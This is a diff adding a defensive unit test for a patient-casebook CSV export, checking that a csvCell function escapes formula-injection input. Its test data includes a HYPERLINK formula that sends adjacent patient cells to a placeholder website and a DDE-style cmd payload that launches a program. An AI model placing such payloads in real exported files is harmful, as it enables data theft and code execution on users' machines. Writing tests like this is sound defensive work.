@@ -80,3 +80,20 @@ test("casebook export rows carry condition/domain/kind and no identifiers", () =
   assert.strictEqual(rows[0][4], "yes", "reviewed");
   assert.ok(!/\n/.test(rows[0][9]), "teaching note newlines flattened for CSV");
 });
+
+
+/* ═══ SPREADSHEET FORMULA INJECTION (full audit, 2026-09-24) ═══
+   A cell starting = + - @ runs as a formula when the CSV is opened. A name or
+   complaint of =HYPERLINK("https://…?"&A2,"x") would send the neighbouring
+   cells — other patients' details — to a website on one click. */
+test("csvCell neutralises formulas but keeps signed numbers numeric", () => {
+  const { csvCell } = require("../js/data-export.js");
+  for (const f of ["=1+1", "=HYPERLINK(\"https://x/?\"&A2,\"open\")", "@SUM(A1:A9)", "-2+cmd|' /C calc'!A0", "+x", "\t=1"]) {
+    const out = csvCell(f).replace(/^"/, "");
+    assert.ok(out.startsWith("'"), JSON.stringify(f) + " would run as a formula: " + csvCell(f));
+  }
+  for (const n of ["-3.00", "+2.25", "-0.5", "12", ".75"]) {
+    assert.strictEqual(csvCell(n), n, "a signed number must stay a number: " + n);
+  }
+  assert.strictEqual(csvCell("Smith"), "Smith");
+});
